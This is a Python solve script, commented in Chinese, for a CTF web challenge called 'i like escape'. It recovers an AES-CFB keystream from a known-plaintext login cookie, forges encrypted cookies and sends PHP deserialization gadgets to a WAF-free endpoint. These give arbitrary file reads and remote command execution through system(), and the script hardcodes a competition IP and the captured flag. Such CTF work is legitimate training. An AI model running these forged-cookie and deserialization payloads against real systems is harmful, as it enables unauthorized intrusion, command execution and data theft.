#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve.py — 环节二 web03「i like escape」：流密码 cookie 已知明文伪造 + PHP 反序列化 RCE

qid : KQ6JKe9T37LEAz_z    分值: 500    分类: web
flag: flag{7386fc3b-9ec1-428c-aff3-483317221af0}

题面
----
    i like escape
    源码在 /www.zip（本题下发后，请通过 http 访问相应的 ip 和 port，
    例如 nc ip port，改为 http://ip:port/）

利用链（3 条独立考点）
---------------------
① **流模式密码（CTR/OFB/CFB）没有 PKCS#7 ⇒ 密文长度 == 明文长度**
   `algorithm.php` 是自研加密：`openssl_encrypt($pt, 'aes-128-cfb', $key,
   OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, $iv)`。
   实测 `ct_len == pt_len`（164 == 164）直接排除了 CBC（CBC 必有填充）。
   流模式的 keystream 只依赖 (key, iv)：`ct = pt XOR ks` ⇒ `ks = pt XOR ct`。
   用 `username='P'*64` 让明文完全可预测，一次登录即可恢复整条 keystream。
   注意：恢复出的 keystream 必须复用**同一个 IV**（本题 IV 随 cookie 一起下发，
   不需要猜——直接从 Set-Cookie 里解析出来）。

② **PHP 反序列化，两类 gadget 都可用**
   · 任意文件读：`O:4:"FILE":1:{s:8:"filename";s:5:"/flag";}` 打在 login.php
   · 命令执行  ：`O:5:"admin":2:{s:5:"admin";N;s:4:"root";O:4:"Date":1:{s:3:"cmd";...}}`
     打在 `eeeeeend1ng.php`（该文件 **不 require waf.php**，a() 黑名单完全不生效）
   index.php / login.php 都挂了 a() 的 `stripos` 子串黑名单，只盯 login.php 会一直吃 `Hacker!`。

③ **cookie 的双层 base64 与 URL 编码细节**
   cookie 值 = `base64( base64(ct) + '::' + hex(iv) )`
   PHP `setcookie()` 会把 `=` 编码为 `%3D`，且内层 base64 的 `=` padding 会被吃掉
   ⇒ 解析时必须 `unquote()` + `strip('"')` + 把 `' '` 还原成 `'+'` + 重新补 `=` padding。

用法
----
    python solve.py --target http://127.0.0.1:8080
    python solve.py --target http://123.56.12.16:26753      # 比赛原始地址（会轮换）
    python solve.py --target ... --submit
    python solve.py --target ... --dump-source             # 顺便把 /www.zip 拉下来
"""
from __future__ import annotations

import argparse
import base64
import binascii
import json
import os
import re
import sys
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

COMPETITION_TARGET = 'http://123.56.12.16:26753'
QID = 'KQ6JKe9T37LEAz_z'
FLAG_RE = re.compile(r'flag\{[^}]{1,200}\}')
PROBE = b'P' * 64            # 已知明文的填充字符


# --------------------------------------------------------------------------
# PHP 序列化助手（私有属性名里的 \x00 必须原样保留）
# --------------------------------------------------------------------------
def php_ser_users(u: bytes, p: bytes) -> bytes:
    """复刻 serialize(new Users($u, $p, 'True'))；private 属性名带 NUL 前缀"""
    n1 = b'\x00Users\x00username'
    n2 = b'\x00Users\x00passwd'
    return (b'O:5:"Users":3:{'
            b's:' + str(len(n1)).encode() + b':"' + n1 + b'";'
            b's:' + str(len(u)).encode() + b':"' + u + b'";'
            b's:' + str(len(n2)).encode() + b':"' + n2 + b'";'
            b's:' + str(len(p)).encode() + b':"' + p + b'";'
            b's:6:"status";s:4:"True";}')


def php_ser_file(path: str) -> bytes:
    """FILE gadget —— 任意文件读"""
    pb = path.encode()
    return (b'O:4:"FILE":1:{s:8:"filename";s:' + str(len(pb)).encode() +
            b':"' + pb + b'";}')


def php_ser_rce(cmd: str) -> bytes:
    """admin -> root(Date) -> system() gadget —— 命令执行"""
    cb = cmd.encode()
    return (b'O:5:"admin":2:{s:5:"admin";N;s:4:"root";'
            b'O:4:"Date":1:{s:3:"cmd";s:' + str(len(cb)).encode() +
            b':"' + cb + b'";}}')


# --------------------------------------------------------------------------
# cookie 编解码（考点 ③）
# --------------------------------------------------------------------------
def parse_cookie(cookie_val: str):
    """cookie -> (ct, iv)

    PHP setcookie() 的 URL 编码 + 内层 base64 padding 丢失都要处理。
    """
    v = urllib.parse.unquote(cookie_val.strip().strip('"'))
    v = v.replace(' ', '+')                       # '+' 在 cookie 里可能被写成空格
    v += '=' * (-len(v) % 4)                      # 外层 padding
    inner = base64.b64decode(v).decode('latin-1')

    ct_b64, iv_hex = inner.split('::', 1)
    ct_b64 = ct_b64.strip()
    ct_b64 += '=' * (-len(ct_b64) % 4)            # ★ 内层 padding 补齐
    return base64.b64decode(ct_b64), binascii.unhexlify(iv_hex.strip())


def build_cookie(ct: bytes, iv: bytes) -> str:
    inner = base64.b64encode(ct).decode() + '::' + iv.hex()
    outer = base64.b64encode(inner.encode()).decode()
    return urllib.parse.quote(outer, safe='')     # 与 setcookie 的编码对齐


# --------------------------------------------------------------------------
def solve(target: str, verbose: bool = True, dump_source: bool = False,
          extra_paths: list[str] | None = None) -> dict:
    target = target.rstrip('/')
    s = requests.Session()
    s.trust_env = False                            # 绕本机代理
    res: dict = {'target': target, 'probe': {}, 'keystream_len': 0, 'flag': None,
                 'via': None, 'root_listing': None}

    def log(m):
        if verbose:
            print(m, flush=True)

    log(f'[*] target = {target}')

    # ---------- 步骤 0（可选）：下载 /www.zip 审计源码 ----------
    if dump_source:
        try:
            r = s.get(target + '/www.zip', timeout=30, verify=False)
            log(f'[*] GET /www.zip -> {r.status_code} len={len(r.content)}')
            if r.status_code == 200 and r.content[:2] == b'PK':
                out = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'www.zip')
                open(out, 'wb').write(r.content)
                log(f'[+] 源码已保存 {out}')
        except Exception as e:
            log(f'[!] /www.zip 下载失败 {type(e).__name__}')

    # ---------- 步骤 1：加密预言机 → 已知明文/密文对 ----------
    log('\n=== 1) 加密预言机：username=64×"P" 取一条已知明文/密文对 ===')
    try:
        r = s.post(target + '/index.php',
                   data={'username': PROBE.decode(), 'passwd': 'x'},
                   timeout=20, verify=False, allow_redirects=False)
    except Exception as e:
        log(f'[!] index.php 请求失败 {type(e).__name__}: {e}')
        return res
    m = re.search(r'user=([^;]+)', r.headers.get('Set-Cookie') or '')
    if not m:
        log(f'[!] 未拿到 Set-Cookie user=（status={r.status_code}）')
        log('    body: ' + r.text[:300])
        return res
    ct, iv = parse_cookie(m.group(1))
    pt = php_ser_users(PROBE, b'x')
    log(f'    pt_len={len(pt)}  ct_len={len(ct)}  iv={iv.hex()} ({len(iv)}B)')
    if len(ct) != len(pt):
        log(f'[!] ct_len != pt_len，说明不是"无填充的流模式"（可能是 CBC，需换剪切粘贴法）')
    res['probe'] = {'pt_len': len(pt), 'ct_len': len(ct), 'iv': iv.hex()}

    # ---------- 步骤 2：恢复 keystream（考点 ①）----------
    ks = bytes(a ^ b for a, b in zip(pt, ct))
    res['keystream_len'] = len(ks)
    log(f'[*] 流模式判定: ct_len == pt_len → 无 PKCS#7；ks = pt XOR ct 恢复 {len(ks)} 字节')
    # 自检：用 ks 反向加密应等于原密文
    assert bytes(a ^ b for a, b in zip(pt, ks)) == ct
    log('    [ok] keystream 自检通过')

    def forge(obj: bytes) -> str:
        if len(obj) > len(ks):
            raise ValueError(f'payload {len(obj)}B 超过 keystream {len(ks)}B')
        return build_cookie(bytes(a ^ b for a, b in zip(obj, ks)), iv)

    def fire(endpoint: str, cookie_name: str, obj: bytes, label: str) -> tuple[int, str]:
        ck = forge(obj)
        rr = s.get(target + endpoint, headers={'Cookie': f'{cookie_name}={ck}'},
                   timeout=25, verify=False, allow_redirects=False)
        body = rr.content.decode('utf-8', 'replace')
        head = body.strip().replace('\n', ' ')[:160]
        log(f'  [{label}] {endpoint} -> {rr.status_code} len={len(body)}  {head}')
        return rr.status_code, body

    # ---------- 步骤 3：FILE gadget 任意读 ----------
    log('\n=== 3) FILE gadget 任意文件读（login.php，cookie=user）===')
    paths = extra_paths or ['/flag', '/flag.txt', '/tmp/flag', '/root/flag']
    for pth in paths:
        try:
            _, body = fire('/login.php', 'user', php_ser_file(pth), f'FILE:{pth}')
        except Exception as e:
            log(f'  [FILE:{pth}] ERR {e}')
            continue
        mm = FLAG_RE.search(body)
        if mm:
            res['flag'], res['via'] = mm.group(0), f'FILE read {pth}'
            return res

    # ---------- 步骤 4：eeeeeend1ng.php 上的 RCE（考点 ②）----------
    log('\n=== 4) RCE：admin -> root(Date) -> system()，打 eeeeeend1ng.php（不过 a() 过滤）===')
    log('    ★ 注意：本题的 FILE gadget 输出发生在 __destruct（页面尾部），')
    log('      而 RCE 输出也落在 </html> 之后 —— flag 正则必须扫**整个 body**，')
    log('      只解析 <pre> 区块会漏。')
    cmds = [
        'cat /flag* /var/www/html/flag* 2>&1',
        'ls -la / /var/www/html;cat /flag* /var/www/html/flag* 2>&1',
        'ls -la /var/www/html',
    ]
    for cmd in cmds:
        obj = php_ser_rce(cmd)
        if len(obj) > len(ks):
            log(f'  [skip] payload {len(obj)}B > ks {len(ks)}B: {cmd}')
            continue
        try:
            _, body = fire('/eeeeeend1ng.php', 'users', obj, f'RCE:{cmd[:22]}')
        except Exception as e:
            log(f'  [RCE] ERR {e}')
            continue
        # 回显落在 </html> 之后，整段 body 都扫
        tail = body.split('</html>')[-1].strip()
        if tail:
            log('   --- RCE 回显 ---')
            log('   ' + tail[:1200].replace('\n', '\n   '))
        if res['root_listing'] is None and ('total ' in body or 'drwx' in body):
            res['root_listing'] = body
        mm = FLAG_RE.search(body)
        if mm:
            res['flag'], res['via'] = mm.group(0), f'RCE (users cookie): {cmd}'
            return res
        # 回显里出现 /flag_<hex> 这类随机名 → 追加一次精确 cat / FILE 读
        mfile = re.search(r'(\S*/flag[A-Za-z0-9_.\-]*)', tail or body)
        if mfile:
            target_file = mfile.group(1).lstrip('|').strip()
            log(f'  [i] 回显里发现 flag 文件名: {target_file} → 追加精确读取')
            cmd2 = f'cat {target_file} 2>&1'
            try:
                _, body2 = fire('/eeeeeend1ng.php', 'users', php_ser_rce(cmd2), 'RCE:cat-guess')
            except Exception as e:
                log(f'  [RCE] ERR {e}')
                continue
            mm2 = FLAG_RE.search(body2)
            if mm2:
                res['flag'], res['via'] = mm2.group(0), f'RCE: {cmd2}'
                return res
            try:
                _, body3 = fire('/login.php', 'user', php_ser_file(target_file), 'FILE:guess')
            except Exception as e:
                log(f'  [FILE] ERR {e}')
                continue
            mm3 = FLAG_RE.search(body3)
            if mm3:
                res['flag'], res['via'] = mm3.group(0), f'FILE read {target_file}'
                return res

    return res


def main() -> int:
    ap = argparse.ArgumentParser(description='环节二 web03 · i like escape')
    ap.add_argument('--target', '-t', default=COMPETITION_TARGET,
                    help='靶场基址，如 http://127.0.0.1:8080')
    ap.add_argument('--path', action='append', default=None, help='额外尝试读取的路径')
    ap.add_argument('--dump-source', action='store_true', help='顺便下载 /www.zip')
    ap.add_argument('--submit', action='store_true', help='取到 flag 后提交平台')
    ap.add_argument('--json', action='store_true', help='JSON 输出')
    args = ap.parse_args()

    res = solve(args.target, verbose=not args.json, dump_source=args.dump_source,
                extra_paths=args.path)

    if args.json:
        print(json.dumps(res, ensure_ascii=False, indent=2))
    elif res['flag']:
        print(f"\n[+] FLAG = {res['flag']}")
        print(f"[+] 取得方式: {res['via']}")
    else:
        print('\n[-] 未取到 flag')

    if args.submit and res['flag']:
        sys.path.insert(0, r'D:\2026\湾区杯\决赛')
        try:
            import agent_api as A
            print('[SUBMIT]', A.api_submit(A.load_token(), QID, res['flag']))
        except Exception as e:
            print('[!] 提交失败:', e)
    return 0 if res['flag'] else 1


if __name__ == '__main__':
    sys.exit(main())
